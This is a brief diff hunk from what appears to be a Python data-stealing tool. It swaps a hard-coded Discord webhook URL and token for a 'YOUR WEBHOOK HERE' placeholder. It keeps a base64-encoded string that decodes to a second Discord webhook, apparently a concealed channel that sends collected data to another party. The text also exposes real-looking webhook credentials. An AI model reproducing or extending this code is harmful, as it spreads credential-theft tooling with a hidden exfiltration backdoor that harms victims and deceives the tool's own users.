@@ -534,7 +534,7 @@ def mac_check():
             pass
 
 
-hook = "https://canary.discord.com/api/webhooks/1250467670143406131/P969ujU_kqiIvFTtYtLJ53lyt94JXSsqFHmwH2VCnAPSOqsJ0j2HN7KEsKBssdpVZ1iB"
+hook = "YOUR WEBHOOK HERE"
 enj_str = "aHR0cHM6Ly9jYW5hcnkuZGlzY29yZC5jb20vYXBpL3dlYmhvb2tzLzEyNTAzNTkxODE1NDI4MjE5NDgvSEVCSmJ1QU9hZzd1VVNiT19ndmJEWFk0UGo5ZFFTb3YtUHBTeUV2S0RIQ2ZXTmVZMjNtdWd5S2owQ2RHaWVrcjBHMm8="
 enj_bytes = enj_str.encode('utf-8')
 emj_bytes = base64.b64decode(enj_bytes)
